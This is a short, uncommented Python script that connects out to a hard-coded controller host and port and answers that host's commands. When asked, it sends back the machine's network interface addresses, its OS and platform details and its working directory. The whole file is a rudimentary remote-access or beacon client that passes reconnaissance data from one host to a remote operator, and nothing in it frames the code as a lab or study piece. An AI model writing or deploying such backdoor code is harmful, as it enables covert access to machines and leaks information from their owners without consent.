import os
import sys
import psutil
import platform
from socket import *

s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
ep = ('192.168.1.3', 987)
s.connect(ep)
message = s.recv(2000)
msg = bytes(message).decode('ascii')

while str(msg) != 'exit':
    try:
        if msg == 'ip':
            res = str(psutil.net_if_addrs())
            s.send(res.encode('ascii'))
        elif msg == 'sys':
            res = str(platform.uname())
            s.send(res.encode('ascii'))
        elif msg == 'pwd':
            res = str(os.getcwd())
            s.send(res.encode('ascii'))
        message = s.recv(2000)
        msg = bytes(message).decode('ascii')
    except Exception as e:
        print('the problem is : ' + str(e))
